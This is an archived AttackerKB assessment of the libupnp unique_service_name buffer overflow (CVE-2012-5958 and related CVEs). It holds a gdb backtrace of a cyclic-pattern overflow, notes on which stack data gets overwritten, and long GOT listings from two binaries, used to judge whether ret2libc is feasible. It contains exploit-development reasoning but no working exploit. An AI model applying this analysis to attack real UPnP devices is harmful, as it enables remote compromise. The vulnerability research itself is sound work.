---
title: UPnP unique_service_name Buffer Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2013-01-31T21:55:00'
created: '2019-09-12T18:07:07.076144'
revision_date: '2020-02-13T17:12:20.802772'
assessment_id: 509c2509-506a-4e94-a0f2-ecc054ec348d
topic_id: 8f0e9a23-04d0-42b5-9735-9bc6a4d70879
topic_short_id: 3blYlvxFPa
topic_slug: upnp-unique-service-name-buffer-overflow
akb_topic_url: https://attackerkb.com/topics/3blYlvxFPa/upnp-unique-service-name-buffer-overflow
akb_assessment_url: https://attackerkb.com/topics/3blYlvxFPa/upnp-unique-service-name-buffer-overflow#509c2509-506a-4e94-a0f2-ecc054ec348d
---

# UPnP unique_service_name Buffer Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/3blYlvxFPa/upnp-unique-service-name-buffer-overflow#509c2509-506a-4e94-a0f2-ecc054ec348d).*

---

* How unique_service_name is reached?00

```
Breakpoint 4, unique_service_name (
    cmd=0x8053ad8 "uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"..., Evt=0xb57e6ca4) at src/ssdp/ssdp_server.c:496
496	    printf("[*] unique_service_name()\n");
(gdb) bt
#0  unique_service_name (
    cmd=0x8053ad8 "uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"..., Evt=0xb57e6ca4) at src/ssdp/ssdp_server.c:496
#1  0x0013464a in ssdp_request_type (
    cmd=0x8053ad8 "uuid:schemas:device:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"..., Evt=0xb57e7260) at src/ssdp/ssdp_server.c:624
#2  0x001326c9 in ssdp_handle_device_request (hmsg=0x8051bb0, dest_addr=0x8051c8c) at src/ssdp/ssdp_device.c:127
#3  0x001341e8 in ssdp_event_handler_thread (the_data=0x8051bb0) at src/ssdp/ssdp_server.c:787
#4  0x0015f306 in WorkerThread (arg=0x15b340) at src/ThreadPool.c:533
#5  0x0017596e in start_thread () from /lib/tls/i686/cmov/libpthread.so.0
#6  0x00256a4e in clone () from /lib/tls/i686/cmov/libc.so.6
```

* CVE-2012-5958

TempBuf Overflowed, at the current stack frame

* CVE-2012-5959, CVE-2012-5961, CVE-2012-5962, CVE-2012-5963, CVE-2012-5964, CVE-2012-5965, CVE-2012-5960

Evt members overflowed. Evt stored at the ssdp_handle_device_request frame:

	ssdp_handle_device_request( IN http_message_t * hmsg, IN struct sockaddr_in *dest_addr )

	int handle;
	struct Handle_Info *dev_info = NULL;
	memptr hdr_value;
	int mx;
	char save_char;
	SsdpEvent event; <==
	int ret_code;
	SsdpSearchReply *threadArg = NULL;
	ThreadPoolJob job;
	int replyTime;
	int maxAge;

* CVE-2012-5958, assuming no PIE for the main executable, which has been found in the wild, having into account
which goodchars are from 0x01-0x7f or 0x80-0xff (with exceptions), doesn't seem feasible to use any of these
addresses to make a type of ret2libc:

(1) .got.plt for upnp_tv_device, the check program linked with libupnp (compiled on ubuntu 10.04 with
gcc flags to disable stack-cookies and fortify libc checks)

```
.got.plt:0804F000 off_804F000     dd offset UpnpInit      ; DATA XREF: _UpnpInitr
.got.plt:0804F004 off_804F004     dd offset sigemptyset   ; DATA XREF: _sigemptysetr
.got.plt:0804F008 off_804F008     dd offset UpnpSendAdvertisement
.got.plt:0804F008                                         ; DATA XREF: _UpnpSendAdvertisementr
.got.plt:0804F00C off_804F00C     dd offset sprintf       ; DATA XREF: _sprintfr
.got.plt:0804F010 off_804F010     dd offset ixmlPrintNode ; DATA XREF: _ixmlPrintNoder
.got.plt:0804F014 off_804F014     dd offset ixmlNode_getNodeType
.got.plt:0804F014                                         ; DATA XREF: _ixmlNode_getNodeTyper
.got.plt:0804F018 off_804F018     dd offset __gmon_start__ ; DATA XREF: ___gmon_start__r
.got.plt:0804F01C off_804F01C     dd offset __isoc99_sscanf ; DATA XREF: ___isoc99_sscanfr
.got.plt:0804F020 off_804F020     dd offset UpnpUnRegisterRootDevice
.got.plt:0804F020                                         ; DATA XREF: _UpnpUnRegisterRootDevicer
.got.plt:0804F024 off_804F024     dd offset vsnprintf     ; DATA XREF: _vsnprintfr
.got.plt:0804F028 off_804F028     dd offset ixmlNode_getFirstChild
.got.plt:0804F028                                         ; DATA XREF: _ixmlNode_getFirstChildr
.got.plt:0804F02C off_804F02C     dd offset fgets         ; DATA XREF: _fgetsr
.got.plt:0804F030 off_804F030     dd offset ixmlNode_getNodeValue
.got.plt:0804F030                                         ; DATA XREF: _ixmlNode_getNodeValuer
.got.plt:0804F034 off_804F034     dd offset __libc_start_main
.got.plt:0804F034                                         ; DATA XREF: ___libc_start_mainr
.got.plt:0804F038 off_804F038     dd offset UpnpAddToActionResponse
.got.plt:0804F038                                         ; DATA XREF: _UpnpAddToActionResponser
.got.plt:0804F03C off_804F03C     dd offset ixmlNodeList_length
.got.plt:0804F03C                                         ; DATA XREF: _ixmlNodeList_lengthr
.got.plt:0804F040 off_804F040     dd offset UpnpGetServerIpAddress
.got.plt:0804F040                                         ; DATA XREF: _UpnpGetServerIpAddressr
.got.plt:0804F044 off_804F044     dd offset __assert_fail ; DATA XREF: ___assert_failr
.got.plt:0804F048 off_804F048     dd offset pthread_mutexattr_setkind_np
.got.plt:0804F048                                         ; DATA XREF: _pthread_mutexattr_setkind_npr
.got.plt:0804F04C off_804F04C     dd offset UpnpAcceptSubscription
.got.plt:0804F04C                                         ; DATA XREF: _UpnpAcceptSubscriptionr
.got.plt:0804F050 off_804F050     dd offset UpnpResolveURL ; DATA XREF: _UpnpResolveURLr
.got.plt:0804F054 off_804F054     dd offset sigwait       ; DATA XREF: _sigwaitr
.got.plt:0804F058 off_804F058     dd offset strtol        ; DATA XREF: _strtolr
.got.plt:0804F05C off_804F05C     dd offset free          ; DATA XREF: _freer
.got.plt:0804F060 off_804F060     dd offset ixmlCloneDOMString
.got.plt:0804F060                                         ; DATA XREF: _ixmlCloneDOMStringr
.got.plt:0804F064 off_804F064     dd offset pthread_mutex_unlock
.got.plt:0804F064                                         ; DATA XREF: _pthread_mutex_unlockr
.got.plt:0804F068 off_804F068     dd offset UpnpGetServerPort
.got.plt:0804F068                                         ; DATA XREF: _UpnpGetServerPortr
.got.plt:0804F06C off_804F06C     dd offset pthread_mutexattr_destroy
.got.plt:0804F06C                                         ; DATA XREF: _pthread_mutexattr_destroyr
.got.plt:0804F070 off_804F070     dd offset ixmlNodeList_free
.got.plt:0804F070                                         ; DATA XREF: _ixmlNodeList_freer
.got.plt:0804F074 off_804F074     dd offset ixmlDocument_free
.got.plt:0804F074                                         ; DATA XREF: _ixmlDocument_freer
.got.plt:0804F078 off_804F078     dd offset strlen        ; DATA XREF: _strlenr
.got.plt:0804F07C off_804F07C     dd offset pthread_mutex_destroy
.got.plt:0804F07C                                         ; DATA XREF: _pthread_mutex_destroyr
.got.plt:0804F080 off_804F080     dd offset strcpy        ; DATA XREF: _strcpyr
.got.plt:0804F084 off_804F084     dd offset printf        ; DATA XREF: _printfr
.got.plt:0804F088 off_804F088     dd offset pthread_mutex_init
.got.plt:0804F088                                         ; DATA XREF: _pthread_mutex_initr
.got.plt:0804F08C off_804F08C     dd offset strcasecmp    ; DATA XREF: _strcasecmpr
.got.plt:0804F090 off_804F090     dd offset malloc        ; DATA XREF: _mallocr
.got.plt:0804F094 off_804F094     dd offset pthread_mutex_lock
.got.plt:0804F094                                         ; DATA XREF: _pthread_mutex_lockr
.got.plt:0804F098 off_804F098     dd offset UpnpDownloadXmlDoc
.got.plt:0804F098                                         ; DATA XREF: _UpnpDownloadXmlDocr
.got.plt:0804F09C off_804F09C     dd offset UpnpSetWebServerRootDir
.got.plt:0804F09C                                         ; DATA XREF: _UpnpSetWebServerRootDirr
.got.plt:0804F0A0 off_804F0A0     dd offset pthread_create ; DATA XREF: _pthread_creater
.got.plt:0804F0A4 off_804F0A4     dd offset sigaddset     ; DATA XREF: _sigaddsetr
.got.plt:0804F0A8 off_804F0A8     dd offset ixmlElement_getElementsByTagName
.got.plt:0804F0A8                                         ; DATA XREF: _ixmlElement_getElementsByTagNamer
.got.plt:0804F0AC off_804F0AC     dd offset UpnpFinish    ; DATA XREF: _UpnpFinishr
.got.plt:0804F0B0 off_804F0B0     dd offset UpnpRegisterRootDevice
.got.plt:0804F0B0                                         ; DATA XREF: _UpnpRegisterRootDevicer
.got.plt:0804F0B4 off_804F0B4     dd offset UpnpNotify    ; DATA XREF: _UpnpNotifyr
.got.plt:0804F0B8 off_804F0B8     dd offset ixmlNodeList_item
.got.plt:0804F0B8                                         ; DATA XREF: _ixmlNodeList_itemr
.got.plt:0804F0BC off_804F0BC     dd offset snprintf      ; DATA XREF: _snprintfr
.got.plt:0804F0C0 off_804F0C0     dd offset pthread_mutexattr_init
.got.plt:0804F0C0                                         ; DATA XREF: _pthread_mutexattr_initr
.got.plt:0804F0C4 off_804F0C4     dd offset strcmp        ; DATA XREF: _strcmpr
.got.plt:0804F0C8 off_804F0C8     dd offset __strdup      ; DATA XREF: ___strdupr
.got.plt:0804F0CC off_804F0CC     dd offset exit          ; DATA XREF: _exitr
.got.plt:0804F0D0 off_804F0D0     dd offset ixmlFreeDOMString
.got.plt:0804F0D0                                         ; DATA XREF: _ixmlFreeDOMStringr
.got.plt:0804F0D4 off_804F0D4     dd offset ixmlDocument_getElementsByTagName
.got.plt:0804F0D4                                         ; DATA XREF: _ixmlDocument_getElementsByTagNamer
.got.plt:0804F0D4 _got_plt        ends
.got.plt:0804F0D4
```

* For the dms executable

```
.got.plt:080BA208 off_80BA208     dd offset __cxa_end_catch ; DATA XREF: ___cxa_end_catchr
.got.plt:080BA20C off_80BA20C     dd offset __cxa_rethrow ; DATA XREF: ___cxa_rethrowr
.got.plt:080BA210 off_80BA210     dd offset _ZN11MediaServer15GetAbsolutePathERKSs
.got.plt:080BA210                                         ; DATA XREF: MediaServer::GetAbsolutePath(std::string  const&)r
.got.plt:080BA210                                         ; MediaServer::GetAbsolutePath(std::string  const&)
.got.plt:080BA214 off_80BA214     dd offset _ZN14SynoAudioUtils25RadioGetGenreStationCountEj
.got.plt:080BA214                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreStationCount(uint)r
.got.plt:080BA214                                         ; SynoAudioUtils::RadioGetGenreStationCount(uint)
.got.plt:080BA218 off_80BA218     dd offset UpnpInit      ; DATA XREF: _UpnpInitr
.got.plt:080BA21C off_80BA21C     dd offset UpnpSetVirtualDirCallbacks
.got.plt:080BA21C                                         ; DATA XREF: _UpnpSetVirtualDirCallbacksr
.got.plt:080BA220 off_80BA220     dd offset mkdir         ; DATA XREF: _mkdirr
.got.plt:080BA224 off_80BA224     dd offset pthread_getspecific
.got.plt:080BA224                                         ; DATA XREF: _pthread_getspecificr
.got.plt:080BA228 off_80BA228     dd offset _ZN11MediaServer7MediaDB12AddConditionERKSs
.got.plt:080BA228                                         ; DATA XREF: MediaServer::MediaDB::AddCondition(std::string  const&)r
.got.plt:080BA228                                         ; MediaServer::MediaDB::AddCondition(std::string  const&)
.got.plt:080BA22C off_80BA22C     dd offset _ZN11MediaServer15DMSStringBundle9TranslateERKSs
.got.plt:080BA22C                                         ; DATA XREF: MediaServer::DMSStringBundle::Translate(std::string  const&)r
.got.plt:080BA22C                                         ; MediaServer::DMSStringBundle::Translate(std::string  const&)
.got.plt:080BA230 off_80BA230     dd offset ixmlNode_getFirstChild
.got.plt:080BA230                                         ; DATA XREF: _ixmlNode_getFirstChildr
.got.plt:080BA234 off_80BA234     dd offset _ZN11MediaServer7MediaDB10FetchFieldEPKc
.got.plt:080BA234                                         ; DATA XREF: MediaServer::MediaDB::FetchField(char  const*)r
.got.plt:080BA234                                         ; MediaServer::MediaDB::FetchField(char  const*)
.got.plt:080BA238 off_80BA238     dd offset _ZN11MediaServer18DMSGetThumbnailResEiiPiS0_i
.got.plt:080BA238                                         ; DATA XREF: MediaServer::DMSGetThumbnailRes(int,int,int *,int *,int)r
.got.plt:080BA238                                         ; MediaServer::DMSGetThumbnailRes(int,int,int *,int *,int)
.got.plt:080BA23C off_80BA23C     dd offset _ZNSt8ios_base4InitC1Ev
.got.plt:080BA23C                                         ; DATA XREF: std::ios_base::Init::Init(void)r
.got.plt:080BA23C                                         ; std::ios_base::Init::Init(void)
.got.plt:080BA240 off_80BA240     dd offset strchr        ; DATA XREF: _strchrr
.got.plt:080BA244 off_80BA244     dd offset _ZN11MediaServer21XMLGetElmentTextValueEP10_IXML_Node
.got.plt:080BA244                                         ; DATA XREF: MediaServer::XMLGetElmentTextValue(_IXML_Node *)r
.got.plt:080BA244                                         ; MediaServer::XMLGetElmentTextValue(_IXML_Node *)
.got.plt:080BA248 off_80BA248     dd offset _ZN11MediaServer19DMSGetProductSerialEv
.got.plt:080BA248                                         ; DATA XREF: MediaServer::DMSGetProductSerial(void)r
.got.plt:080BA248                                         ; MediaServer::DMSGetProductSerial(void)
.got.plt:080BA24C off_80BA24C     dd offset _ZN4Json18StyledStreamWriterC1ESs
.got.plt:080BA24C                                         ; DATA XREF: Json::StyledStreamWriter::StyledStreamWriter(std::string)r
.got.plt:080BA24C                                         ; Json::StyledStreamWriter::StyledStreamWriter(std::string)
.got.plt:080BA250 off_80BA250     dd offset _ZNKSs13find_first_ofEPKcjj
.got.plt:080BA250                                         ; DATA XREF: std::string::find_first_of(char  const*,uint,uint)r
.got.plt:080BA250                                         ; std::string::find_first_of(char  const*,uint,uint)
.got.plt:080BA254 off_80BA254     dd offset _ZN14SynoAudioUtils17RadioGetGenreDataEjRNS_10RadioGenreE
.got.plt:080BA254                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreData(uint,SynoAudioUtils::RadioGenre &)r
.got.plt:080BA254                                         ; SynoAudioUtils::RadioGetGenreData(uint,SynoAudioUtils::RadioGenre &)
.got.plt:080BA258 off_80BA258     dd offset _ZN4Json5ValueC1ENS_9ValueTypeE
.got.plt:080BA258                                         ; DATA XREF: Json::Value::Value(Json::ValueType)r
.got.plt:080BA258                                         ; Json::Value::Value(Json::ValueType)
.got.plt:080BA25C off_80BA25C     dd offset _ZNSt6localeD1Ev
.got.plt:080BA25C                                         ; DATA XREF: std::locale::~locale()r
.got.plt:080BA25C                                         ; std::locale::~locale()
.got.plt:080BA260 off_80BA260     dd offset getopt_long_only ; DATA XREF: _getopt_long_onlyr
.got.plt:080BA264 off_80BA264     dd offset _ZNKSs5rfindEPKcjj
.got.plt:080BA264                                         ; DATA XREF: std::string::rfind(char  const*,uint,uint)r
.got.plt:080BA264                                         ; std::string::rfind(char  const*,uint,uint)
.got.plt:080BA268 off_80BA268     dd offset getpid        ; DATA XREF: _getpidr
.got.plt:080BA26C off_80BA26C     dd offset _ZN7pcrecpp2RE4InitERKSsPKNS_10RE_OptionsE
.got.plt:080BA26C                                         ; DATA XREF: pcrecpp::RE::Init(std::string  const&,pcrecpp::RE_Options  const*)r
.got.plt:080BA26C                                         ; pcrecpp::RE::Init(std::string  const&,pcrecpp::RE_Options  const*)
.got.plt:080BA270 off_80BA270     dd offset strdup        ; DATA XREF: _strdupr
.got.plt:080BA274 off_80BA274     dd offset appendPQExpBuffer
.got.plt:080BA274                                         ; DATA XREF: _appendPQExpBufferr
.got.plt:080BA278 off_80BA278     dd offset _ZN11MediaServer15DMSStringBundleC1ERKSs
.got.plt:080BA278                                         ; DATA XREF: MediaServer::DMSStringBundle::DMSStringBundle(std::string  const&)r
.got.plt:080BA278                                         ; MediaServer::DMSStringBundle::DMSStringBundle(std::string  const&)
.got.plt:080BA27C off_80BA27C     dd offset _ZN11MediaServer13DMSClientList4LoadERKSsS2_
.got.plt:080BA27C                                         ; DATA XREF: MediaServer::DMSClientList::Load(std::string  const&,std::string  const&)r
.got.plt:080BA27C                                         ; MediaServer::DMSClientList::Load(std::string  const&,std::string  const&)
.got.plt:080BA280 off_80BA280     dd offset SYNODlnaContainerTypeGet
.got.plt:080BA280                                         ; DATA XREF: _SYNODlnaContainerTypeGetr
.got.plt:080BA284 off_80BA284     dd offset UpnpRegisterClient
.got.plt:080BA284                                         ; DATA XREF: _UpnpRegisterClientr
.got.plt:080BA288 off_80BA288     dd offset UpnpSearchAsync ; DATA XREF: _UpnpSearchAsyncr
.got.plt:080BA28C off_80BA28C     dd offset write         ; DATA XREF: _writer
.got.plt:080BA290 off_80BA290     dd offset strcmp        ; DATA XREF: _strcmpr
.got.plt:080BA294 off_80BA294     dd offset _ZN14SynoAudioUtils15SmartPLSGetNameEi
.got.plt:080BA294                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetName(int)r
.got.plt:080BA294                                         ; SynoAudioUtils::SmartPLSGetName(int)
.got.plt:080BA298 off_80BA298     dd offset _ZNSt8ios_baseC2Ev
.got.plt:080BA298                                         ; DATA XREF: std::ios_base::ios_base(void)r
.got.plt:080BA298                                         ; std::ios_base::ios_base(void)
.got.plt:080BA29C off_80BA29C     dd offset _ZN11MediaServer13DMSClientList11EraseObjectERKSs
.got.plt:080BA29C                                         ; DATA XREF: MediaServer::DMSClientList::EraseObject(std::string  const&)r
.got.plt:080BA29C                                         ; MediaServer::DMSClientList::EraseObject(std::string  const&)
.got.plt:080BA2A0 off_80BA2A0     dd offset close         ; DATA XREF: _closer
.got.plt:080BA2A4 off_80BA2A4     dd offset SYNODBClose   ; DATA XREF: destr_function:_SYNODBCloser
.got.plt:080BA2A8 off_80BA2A8     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEE5closeEv
.got.plt:080BA2A8                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::close(void)r
.got.plt:080BA2A8                                         ; std::basic_filebuf<char,std::char_traits<char>>::close(void)
.got.plt:080BA2AC off_80BA2AC     dd offset _ZN14SynoAudioUtils18RadioGetGenreCountEv
.got.plt:080BA2AC                                         ; DATA XREF: SynoAudioUtils::RadioGetGenreCount(void)r
.got.plt:080BA2AC                                         ; SynoAudioUtils::RadioGetGenreCount(void)
.got.plt:080BA2B0 off_80BA2B0     dd offset _ZN11MediaServer16DMSGetProductUDNEv
.got.plt:080BA2B0                                         ; DATA XREF: MediaServer::DMSGetProductUDN(void)r
.got.plt:080BA2B0                                         ; MediaServer::DMSGetProductUDN(void)
.got.plt:080BA2B4 off_80BA2B4     dd offset fprintf       ; DATA XREF: _fprintfr
.got.plt:080BA2B8 off_80BA2B8     dd offset SYNOAacObjectTypeGet
.got.plt:080BA2B8                                         ; DATA XREF: _SYNOAacObjectTypeGetr
.got.plt:080BA2BC off_80BA2BC     dd offset pcre_fullinfo ; DATA XREF: _pcre_fullinfor
.got.plt:080BA2C0 off_80BA2C0     dd offset signal        ; DATA XREF: _signalr
.got.plt:080BA2C4 off_80BA2C4     dd offset UpnpSendAdvertisement
.got.plt:080BA2C4                                         ; DATA XREF: _UpnpSendAdvertisementr
.got.plt:080BA2C8 off_80BA2C8     dd offset _ZN11MediaServer7MediaDB15FetchFieldAsIntEPKc
.got.plt:080BA2C8                                         ; DATA XREF: MediaServer::MediaDB::FetchFieldAsInt(char  const*)r
.got.plt:080BA2C8                                         ; MediaServer::MediaDB::FetchFieldAsInt(char  const*)
.got.plt:080BA2CC off_80BA2CC     dd offset ixmlNodeList_length
.got.plt:080BA2CC                                         ; DATA XREF: _ixmlNodeList_lengthr
.got.plt:080BA2D0 off_80BA2D0     dd offset _ZN11MediaServer25GetMACAddressFromARPTableERKSs
.got.plt:080BA2D0                                         ; DATA XREF: MediaServer::GetMACAddressFromARPTable(std::string  const&)r
.got.plt:080BA2D0                                         ; MediaServer::GetMACAddressFromARPTable(std::string  const&)
.got.plt:080BA2D4 off_80BA2D4     dd offset unlink        ; DATA XREF: _unlinkr
.got.plt:080BA2D8 off_80BA2D8     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEE4openEPKcSt13_Ios_Openmode
.got.plt:080BA2D8                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::open(char  const*,std::_Ios_Openmode)r
.got.plt:080BA2D8                                         ; std::basic_filebuf<char,std::char_traits<char>>::open(char  const*,std::_Ios_Openmode)
.got.plt:080BA2DC off_80BA2DC     dd offset _ZSt17__throw_bad_allocv
.got.plt:080BA2DC                                         ; DATA XREF: std::__throw_bad_alloc(void)r
.got.plt:080BA2DC                                         ; std::__throw_bad_alloc(void)
.got.plt:080BA2E0 off_80BA2E0     dd offset open64        ; DATA XREF: _open64r
.got.plt:080BA2E4 off_80BA2E4     dd offset _ZN11MediaServer13DMSClientList10UpdateKeysERKSsS2_S2_RKSt3mapISsSsSt4lessISsESaISt4pairIS1_SsEEE
.got.plt:080BA2E4                                         ; DATA XREF: MediaServer::DMSClientList::UpdateKeys(std::string  const&,std::string  const&,std::string  const&,std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>>  const&)r
.got.plt:080BA2E4                                         ; MediaServer::DMSClientList::UpdateKeys(std::string  const&,std::string  const&,std::string  const&,std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>>  const&)
.got.plt:080BA2E8 off_80BA2E8     dd offset _ZNK7pcrecpp2RE12PartialMatchERKNS_11StringPieceERKNS_3ArgES6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_
.got.plt:080BA2E8                                         ; DATA XREF: pcrecpp::RE::PartialMatch(pcrecpp::StringPiece  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&)r
.got.plt:080BA2E8                                         ; pcrecpp::RE::PartialMatch(pcrecpp::StringPiece  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&)
.got.plt:080BA2EC off_80BA2EC     dd offset strerror      ; DATA XREF: _strerrorr
.got.plt:080BA2F0 off_80BA2F0     dd offset pthread_cancel ; DATA XREF: _pthread_cancelr
.got.plt:080BA2F4 off_80BA2F4     dd offset _ZN11MediaServer11DMSLogCloseEv
.got.plt:080BA2F4                                         ; DATA XREF: sub_8084BDC:MediaServer::DMSLogClose(void)r
.got.plt:080BA2F4                                         ; MediaServer::DMSLogClose(void)
.got.plt:080BA2F8 off_80BA2F8     dd offset _ZN14SynoAudioUtils17SmartPLSListSongsEiiiRiRSt4listI21__tag_SYNO_MEDIA_INFOSaIS2_EEb
.got.plt:080BA2F8                                         ; DATA XREF: SynoAudioUtils::SmartPLSListSongs(int,int,int,int &,std::list<__tag_SYNO_MEDIA_INFO,std::allocator<__tag_SYNO_MEDIA_INFO>> &,bool)r
.got.plt:080BA2F8                                         ; SynoAudioUtils::SmartPLSListSongs(int,int,int,int &,std::list<__tag_SYNO_MEDIA_INFO,std::allocator<__tag_SYNO_MEDIA_INFO>> &,bool)
.got.plt:080BA2FC off_80BA2FC     dd offset termPQExpBuffer ; DATA XREF: _termPQExpBufferr
.got.plt:080BA300 off_80BA300     dd offset dirname       ; DATA XREF: _dirnamer
.got.plt:080BA304 off_80BA304     dd offset _ZNKSs7compareEPKc
.got.plt:080BA304                                         ; DATA XREF: std::string::compare(char  const*)r
.got.plt:080BA304                                         ; std::string::compare(char  const*)
.got.plt:080BA308 off_80BA308     dd offset __cxa_atexit  ; DATA XREF: ___cxa_atexitr
.got.plt:080BA30C off_80BA30C     dd offset __errno_location ; DATA XREF: ___errno_locationr
.got.plt:080BA310 off_80BA310     dd offset _ZN11MediaServer13DMSClientListC1Ev
.got.plt:080BA310                                         ; DATA XREF: MediaServer::DMSClientList::DMSClientList(void)r
.got.plt:080BA310                                         ; MediaServer::DMSClientList::DMSClientList(void)
.got.plt:080BA314 off_80BA314     dd offset MediaInfoDBClose ; DATA XREF: _MediaInfoDBCloser
.got.plt:080BA318 off_80BA318     dd offset _ZN14SynoAudioUtils16SmartPLSGetCountEv
.got.plt:080BA318                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetCount(void)r
.got.plt:080BA318                                         ; SynoAudioUtils::SmartPLSGetCount(void)
.got.plt:080BA31C off_80BA31C     dd offset _ZN11MediaServer17DMSFormatUPNPDateEPKc
.got.plt:080BA31C                                         ; DATA XREF: MediaServer::DMSFormatUPNPDate(char  const*)r
.got.plt:080BA31C                                         ; MediaServer::DMSFormatUPNPDate(char  const*)
.got.plt:080BA320 off_80BA320     dd offset _ZN14SynoAudioUtils20SmartPLSGetSongCountEib
.got.plt:080BA320                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetSongCount(int,bool)r
.got.plt:080BA320                                         ; SynoAudioUtils::SmartPLSGetSongCount(int,bool)
.got.plt:080BA324 off_80BA324     dd offset _ZSt28_Rb_tree_rebalance_for_erasePSt18_Rb_tree_node_baseRS_
.got.plt:080BA324                                         ; DATA XREF: std::_Rb_tree_rebalance_for_erase(std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)r
.got.plt:080BA324                                         ; std::_Rb_tree_rebalance_for_erase(std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)
.got.plt:080BA328 off_80BA328     dd offset access        ; DATA XREF: _accessr
.got.plt:080BA32C off_80BA32C     dd offset ixmlDocument_free
.got.plt:080BA32C                                         ; DATA XREF: _ixmlDocument_freer
.got.plt:080BA330 off_80BA330     dd offset ixmlPrintDocument
.got.plt:080BA330                                         ; DATA XREF: _ixmlPrintDocumentr
.got.plt:080BA334 off_80BA334     dd offset ixmlNode_getAttributes
.got.plt:080BA334                                         ; DATA XREF: _ixmlNode_getAttributesr
.got.plt:080BA338 off_80BA338     dd offset inet_ntoa     ; DATA XREF: _inet_ntoar
.got.plt:080BA33C off_80BA33C     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEEC1Ev
.got.plt:080BA33C                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::basic_filebuf(void)r
.got.plt:080BA33C                                         ; std::basic_filebuf<char,std::char_traits<char>>::basic_filebuf(void)
.got.plt:080BA340 off_80BA340     dd offset ixmlNode_getChildNodes
.got.plt:080BA340                                         ; DATA XREF: _ixmlNode_getChildNodesr
.got.plt:080BA344 off_80BA344     dd offset _ZN11MediaServer15XMLEnumElementsEP10_IXML_NodeRKSs
.got.plt:080BA344                                         ; DATA XREF: MediaServer::XMLEnumElements(_IXML_Node *,std::string  const&)r
.got.plt:080BA344                                         ; MediaServer::XMLEnumElements(_IXML_Node *,std::string  const&)
.got.plt:080BA348 off_80BA348     dd offset _ZNSs7reserveEj
.got.plt:080BA348                                         ; DATA XREF: std::string::reserve(uint)r
.got.plt:080BA348                                         ; std::string::reserve(uint)
.got.plt:080BA34C off_80BA34C     dd offset pcre_get_substring_list
.got.plt:080BA34C                                         ; DATA XREF: _pcre_get_substring_listr
.got.plt:080BA350 off_80BA350     dd offset _ZNKSs4findEPKcjj
.got.plt:080BA350                                         ; DATA XREF: std::string::find(char  const*,uint,uint)r
.got.plt:080BA350                                         ; std::string::find(char  const*,uint,uint)
.got.plt:080BA354 off_80BA354     dd offset malloc        ; DATA XREF: _mallocr
.got.plt:080BA358 off_80BA358     dd offset ixmlCloneDOMString
.got.plt:080BA358                                         ; DATA XREF: _ixmlCloneDOMStringr
.got.plt:080BA35C off_80BA35C     dd offset pthread_mutex_init
.got.plt:080BA35C                                         ; DATA XREF: _pthread_mutex_initr
.got.plt:080BA360 off_80BA360     dd offset fscanf        ; DATA XREF: _fscanfr
.got.plt:080BA364 off_80BA364     dd offset _ZNSsC1ERKSsjj
.got.plt:080BA364                                         ; DATA XREF: std::string::string(std::string  const&,uint,uint)r
.got.plt:080BA364                                         ; std::string::string(std::string  const&,uint,uint)
.got.plt:080BA368 off_80BA368     dd offset SLIBCFileGetKeyValue
.got.plt:080BA368                                         ; DATA XREF: _SLIBCFileGetKeyValuer
.got.plt:080BA36C off_80BA36C     dd offset fread         ; DATA XREF: _freadr
.got.plt:080BA370 off_80BA370     dd offset memmove       ; DATA XREF: _memmover
